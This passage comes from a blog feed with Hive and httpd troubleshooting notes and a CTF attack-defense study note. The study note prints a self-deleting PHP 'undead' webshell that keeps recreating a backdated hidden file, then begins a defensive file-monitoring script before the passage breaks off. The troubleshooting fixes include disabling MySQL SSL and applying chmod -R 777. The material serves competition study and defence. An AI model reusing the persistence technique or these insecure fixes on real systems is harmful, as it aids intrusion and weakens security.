class="line">SLF4J: Found binding in [jar:file:/usr/hadoop/hadoop-2.7.3/share/hadoop/common/lib/slf4j-log4j12-1.7.10.jar!/org/slf4j/impl/StaticLoggerBinder.class]</span><br><span class="line">SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.</span><br><span class="line">SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]</span><br><span class="line">Wed Oct 23 21:11:08 CST 2019 WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.</span><br><span class="line">Wed Oct 23 21:11:08 CST 2019 WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.</span><br><span class="line">Wed Oct 23 21:11:08 CST 2019 WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.</span><br><span class="line">Wed Oct 23 21:11:08 CST 2019 WARN: Establishing SSL connection without server's identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn't set. For compliance with existing applications not using SSL the verifyServerCertificate property is set to 'false'. You need either to explicitly disable SSL by setting useSSL=false, or set useSSL=true and provide truststore for server certificate verification.</span><br><span class="line">javax.jdo.JDOFatalDataStoreException: Unable to open a test connection to the given database. JDBC url = jdbc:mysql://slave2:3306/hive?createDatabaseIfNotExist=true, username = root. Terminating connection pool (set lazyInit to true if you expect to start your database after your app). Original Exception: ------</span><br><span class="line">com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure</span><br><span class="line"></span><br><span class="line">The last packet successfully received from the server was 27 milliseconds ago.  The last packet sent successfully to the server was 26 milliseconds ago.</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:423)</span><br><span class="line">at com.mysql.jdbc.Util.handleNewInstance(Util.java:425)</span><br><span class="line">at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:990)</span><br><span class="line">at com.mysql.jdbc.ExportControlled.transformSocketToSSLSocket(ExportControlled.java:201)</span><br><span class="line">at com.mysql.jdbc.MysqlIO.negotiateSSLConnection(MysqlIO.java:4914)</span><br><span class="line">at com.mysql.jdbc.MysqlIO.proceedHandshakeWithPluggableAuthentication(MysqlIO.java:1663)</span><br><span class="line">at com.mysql.jdbc.MysqlIO.doHandshake(MysqlIO.java:1224)</span><br><span class="line">at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2199)</span><br><span class="line">at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2230)</span><br><span class="line">at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2025)</span><br><span class="line">at com.mysql.jdbc.ConnectionImpl.<span class="tag">&lt;<span class="name">init</span>&gt;</span>(ConnectionImpl.java:778)</span><br><span class="line">at com.mysql.jdbc.JDBC4Connection.<span class="tag">&lt;<span class="name">init</span>&gt;</span>(JDBC4Connection.java:47)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br></pre></td></tr></table></figure></p><p>解决:<br>在<code>hive-site.xml</code>中添加:<br><code>&lt;value&gt;jdbc:mysql://172.18.74.236:3306/hive?createDatabaseIfNotExist=true&amp;amp;characterEncoding=UTF-8&amp;amp;useSSL=false&lt;/value&gt;</code><br><img src="https://img-blog.csdnimg.cn/20191023211402932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>成功!<br><img src="https://img-blog.csdnimg.cn/20191023211603115.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2019102321120560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hive" scheme="https://plutoacharon.github.io/tags/Hive/"/>
    
  </entry>
  
  <entry>
    <title>源码安装httpd报错: checking for APR... configure: error: the --with-apr parameter is incorrect.</title>
    <link href="https://plutoacharon.github.io/2019/10/24/%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85httpd%E6%8A%A5%E9%94%99-checking-for-APR-configure-error-the-with-apr-parameter-is-incorrect/"/>
    <id>https://plutoacharon.github.io/2019/10/24/源码安装httpd报错-checking-for-APR-configure-error-the-with-apr-parameter-is-incorrect/</id>
    <published>2019-10-24T06:36:41.000Z</published>
    <updated>2019-10-24T06:38:49.799Z</updated>
    
    <content type="html"><![CDATA[<p>使用源码安装httpd时,执行命令<br><code>./configure --prefix=/usr/local/apache</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating Makefile</span><br><span class="line">config.status: creating include/apr.h</span><br><span class="line">config.status: creating build/apr_rules.mk</span><br><span class="line">config.status: creating build/pkg/pkginfo</span><br><span class="line">config.status: creating apr--config</span><br><span class="line">config.status: WARNING: apr-config.in seems to ignore the --datarootdir setting</span><br><span class="line">config.status: creating apr.pc</span><br><span class="line">config.status: creating test/Makefile</span><br><span class="line">config.status: creating test/internal/Makefile</span><br><span class="line">config.status: creating include/arch/unix/apr_private.h</span><br><span class="line">config.status: executing default commands</span><br><span class="line">config.status: include/apr.h is unchanged</span><br><span class="line">config.status: include/arch/unix/apr_private.h is unchanged</span><br><span class="line">srclib/apr configured properly</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">setting CC to &quot;&quot;</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">setting CPP to &quot;&quot;</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">setting CFLAGS to &quot;&quot;</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">setting CPPFLAGS to &quot;&quot;</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">setting LDFLAGS to &quot;&quot;</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line">./configure: line 1: ./srclib/apr/apr-1-config: No such file or directory</span><br><span class="line"></span><br><span class="line">Configuring Apache Portable Runtime Utility library...</span><br><span class="line"></span><br><span class="line">checking for APR-util... reconfig</span><br><span class="line">configuring package in srclib/apr-util now</span><br><span class="line">checking build system type... x86_64-unknown-linux-gnu</span><br><span class="line">checking host system type... x86_64-unknown-linux-gnu</span><br><span class="line">checking target system type... x86_64-unknown-linux-gnu</span><br><span class="line">checking for a BSD-compatible install... /usr/bin/install -c</span><br><span class="line">checking for working mkdir -p... yes</span><br><span class="line">APR-util Version: 1.2.10</span><br><span class="line">checking for chosen layout... apr-util</span><br><span class="line">checking for gcc... gcc</span><br><span class="line">checking for C compiler default output file name... a.out</span><br><span class="line">checking whether the C compiler works... yes</span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">checking for suffix of executables...</span><br><span class="line">checking for suffix of object files... o</span><br><span class="line">checking whether we are using the GNU C compiler... yes</span><br><span class="line">checking whether gcc accepts -g... yes</span><br><span class="line">checking for gcc option to accept ISO C89... none needed</span><br><span class="line">Applying apr-util hints file rules for x86_64-unknown-linux-gnu</span><br><span class="line">checking for APR... configure: error: the --with-apr parameter is incorrect. It must specify an install prefix, a build directory, or an apr-config file.</span><br><span class="line">configure failed for srclib/apr-util</span><br></pre></td></tr></table></figure></p><p>猜测可能没有安装gcc,g++库</p><p>安装完报错依旧</p><p>尝试给与<code>httpd-2.2.17</code>权限</p><p><code>chmod -R 777 httpd-2.2.17</code><br><img src="https://img-blog.csdnimg.cn/20191023181906542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用源码安装httpd时,执行命令&lt;br&gt;&lt;code&gt;./configure --prefix=/usr/local/apache&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>Hive启动报错 Could not create ServerSocket on address 0.0.0.0/0.0.0.0:9083</title>
    <link href="https://plutoacharon.github.io/2019/10/24/Hive%E5%90%AF%E5%8A%A8%E6%8A%A5%E9%94%99-Could-not-create-ServerSocket-on-address-0-0-0-0-0-0-0-0-9083/"/>
    <id>https://plutoacharon.github.io/2019/10/24/Hive启动报错-Could-not-create-ServerSocket-on-address-0-0-0-0-0-0-0-0-9083/</id>
    <published>2019-10-24T06:36:02.000Z</published>
    <updated>2019-10-24T06:36:21.767Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; org.apache.thrift.transport.TTransportException: Could not create ServerSocket on address 0.0.0.0/0.0.0.0:9083.</span><br><span class="line"> at org.apache.thrift.transport.TServerSocket.&lt;init&gt;(TServerSocket.java:93)</span><br><span class="line"> at org.apache.thrift.transport.TServerSocket.&lt;init&gt;(TServerSocket.java:75)</span><br><span class="line"> at org.apache.hadoop.hive.metastore.TServerSocketKeepAlive.&lt;init&gt;(TServerSocketKeepAlive.java:34)</span><br><span class="line"> at org.apache.hadoop.hive.metastore.HiveMetaStore.startMetaStore(HiveMetaStore.java:5706)</span><br><span class="line"> at org.apache.hadoop.hive.metastore.HiveMetaStore.main(HiveMetaStore.java:5649)</span><br><span class="line"> at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line"> at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line"> at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line"> at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line"> at org.apache.hadoop.util.RunJar.run(RunJar.java:221)</span><br><span class="line"> at org.apache.hadoop.util.RunJar.main(RunJar.java:136)</span><br></pre></td></tr></table></figure><p>因为运行了hive的metastore,所以造成冲突</p><p>这里使用<code>jps</code>命令将<code>Runjar</code>进程杀掉</p><p><code>kill -s 9 PID</code></p><p>报错解决</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hive" scheme="https://plutoacharon.github.io/tags/Hive/"/>
    
  </entry>
  
  <entry>
    <title>ctf线下AWD攻防赛学习笔记</title>
    <link href="https://plutoacharon.github.io/2019/10/24/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://plutoacharon.github.io/2019/10/24/ctf线下AWD攻防赛学习笔记/</id>
    <published>2019-10-24T06:35:00.000Z</published>
    <updated>2019-10-24T06:35:25.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf线下AWD攻防赛学习笔记"><a href="#ctf线下AWD攻防赛学习笔记" class="headerlink" title="ctf线下AWD攻防赛学习笔记"></a>ctf线下AWD攻防赛学习笔记</h1><p>CTF线下攻防赛主要以攻防模式（Attack &amp; Defense）来呈现。一般在这种模式下，一支参赛队伍有三名队员，所有的参赛队伍都会有同样的初始环境，包含若干台服务器。参赛队伍挖掘漏洞，通过攻击对手的服务器获取Flag来得分，以修补自身服务器的漏洞防止扣分。</p><p>在这种赛制中，不仅仅是比参赛队员的智力和技术，同时也比团队之间的分工配合与合作。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvd3AtY29udGVudC91cGxvYWRzLzIwMTkvMDUvMDUxZGY3YWVmNTE3Zjc0OTZhMDNhODQxYjIwOTUxMzQucG5n?x-oss-process=image/format,png" alt="image"></p><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><ol><li>语言常见漏洞题目</li></ol><p>PHP语言居多</p><p>Python 模板注入(SSTI)：直接利用漏洞执行命令获得Flag、绕过关键字限制。</p><p>Nodejs 任意文件读取：直接读取Flag。</p><p>PHP 各类漏洞：文件包含、反序列化、文件上传、注入、代码执行、命令执行</p><ol start="2"><li><p>后门漏洞</p></li><li><p>公开CMS漏洞</p></li></ol><p>DZ SSRF漏洞、小众CMS 0day、出题人自己改/写的CMS。</p><ol start="4"><li>文件上传漏洞 </li></ol><p>filelocation</p><ol start="5"><li>文件包含漏洞</li></ol><h2 id="分工"><a href="#分工" class="headerlink" title="分工"></a>分工</h2><p>在线下攻防赛中一般需要两名队员作为攻击者来进行漏洞挖掘、权限维持、探查网络、漏洞利用、自动化攻击、自动化提交等。这两名队员中要有一个代码编写能力比较强的人，其主要作用是在短时间内构造出能批量提交、自动化攻击的脚本程序，避免浪费人力在提交Flag上。另一名队员充当防护者的角色进行漏洞修复、后门排查、文件监控、弱口令排查等。</p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>防护一般情况下分为漏洞修复、文件备份、后门排查、文件监控、弱口令排查等。</p><p>漏洞修复即在攻击者角色找到了可以攻击的点之后，在相应的代码处进行过滤、修复。</p><p>文件备份即在开始进行比赛的时候一定要对原始数据进行备份，这样可以防止服务器相关Web文件被删除导致服务Down掉之后可以自行恢复（一般在线下比赛服务Down掉会持续扣分，而重启一次服务会扣掉大量分数）。</p><p>后门排查分为两种情况：第一种为主办方为了照顾水平比较低的选手而留下的隐藏后门，第二种为其他参赛队伍通过漏洞取得服务器一定权限后留下来的后门。针对第一种情况可以开始比赛时把备份文件在后门排查工具里（如D盾、河马）进行一次WebShell审查，找到主办方留下的后门，删除即可</p><p>但是也有可能主办方留下了一个免杀马，在这种情况下，如果有外网可以把源代码下载下来，把官方源代码和比赛源代码进行一次diff，这种办法基本上可以找出所有主办方留下的WebShell。也可以利用这种方式帮助攻击者进行漏洞挖掘，因为如果不是已知公开的漏洞，主办方都会在源代码里进行更改，达到可以GetShell的目的。针对第二种情况要看攻击者留下了什么类型的后门，如果是普通的WebShell一句话或者变种的一句话木马，那么直接删除即可。如果是不死马+内存马就会比较麻烦，因为在线下攻防赛中一般不是root权限，所以是没有权限杀死进程的。一般的不死马都是通过循环创建WebShell文件，如果不杀死进程的话会一直创建下去，但是也会有延时性，可以通过这种延时性写一个暴力循环删除的脚本来达到删除的目的</p><p>常见不死马：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="string">'.config.php'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">    system(<span class="string">'chmod 777 .config.php'</span>); </span><br><span class="line">    touch(<span class="string">".config.php"</span>, mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line">usleep(<span class="number">100</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>文件监控即是要针对攻击者在服务器上创建的任何文件有一个告警或者阻断的操作，要保持服务器的文件不被删除，不允许上传或者创建文件。网上有相应的文件监控的脚本，可以参考学习。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#use: python file_check.py ./</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import ntpath</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典</span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 特殊文件路径字符串</span><br><span class="line">Special_path_str = &apos;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&apos;</span><br><span class="line">bakstring = &apos;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&apos;</span><br><span class="line">logstring = &apos;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;</span><br><span class="line">webshellstring = &apos;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;</span><br><span class="line">difffile = &apos;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&apos;</span><br><span class="line"></span><br><span class="line">Special_string = &apos;drops_log&apos;  # 免死金牌</span><br><span class="line">UNICODE_ENCODING = &quot;utf-8&quot;</span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;</span><br><span class="line"></span><br><span class="line"># 文件路径字典</span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    &apos;bak&apos; : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    &apos;log&apos; : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    &apos;webshell&apos; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    &apos;difffile&apos; : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def isListLike(value):</span><br><span class="line">    return isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取Unicode编码</span><br><span class="line">def getUnicode(value, encoding=None, noneToNull=False):</span><br><span class="line"></span><br><span class="line">    if noneToNull and value is None:</span><br><span class="line">        return NULL</span><br><span class="line"></span><br><span class="line">    if isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) for _ in value)</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    if isinstance(value, unicode):</span><br><span class="line">        return value</span><br><span class="line">    elif isinstance(value, basestring):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                return unicode(value, encoding or UNICODE_ENCODING)</span><br><span class="line">            except UnicodeDecodeError, ex:</span><br><span class="line">                try:</span><br><span class="line">                    return unicode(value, UNICODE_ENCODING)</span><br><span class="line">                except:</span><br><span class="line">                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            return unicode(value)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            return unicode(str(value), errors=&quot;ignore&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 目录创建</span><br><span class="line">def mkdir_p(path):</span><br><span class="line">    import errno</span><br><span class="line">    try:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    except OSError as exc:</span><br><span class="line">        if exc.errno == errno.EEXIST and os.path.isdir(path):</span><br><span class="line">            pass</span><br><span class="line">        else: raise</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取当前所有文件路径</span><br><span class="line">def getfilelist(cwd):</span><br><span class="line">    filelist = []</span><br><span class="line">    for root,subdirs, files in os.walk(cwd):</span><br><span class="line">        for filepath in files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            if Special_path_str not in originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    return filelist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 计算机文件MD5值</span><br><span class="line">def calcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        with open(filepath,&apos;rb&apos;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print u&apos;[!] getmd5_error : &apos; + getUnicode(filepath)</span><br><span class="line">        print getUnicode(e)</span><br><span class="line">        try:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, None)</span><br><span class="line">        except KeyError, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取所有文件MD5</span><br><span class="line">def getfilemd5dict(filelist = []):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    for ori_file in filelist:</span><br><span class="line">        if Special_path_str not in ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            if md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    return filemd5dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 备份所有文件</span><br><span class="line">def backup_file(filelist=[]):</span><br><span class="line">    # if len(os.listdir(Special_path[&apos;bak&apos;])) == 0:</span><br><span class="line">    for filepath in filelist:</span><br><span class="line">        if Special_path_str not in filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[&apos;bak&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print 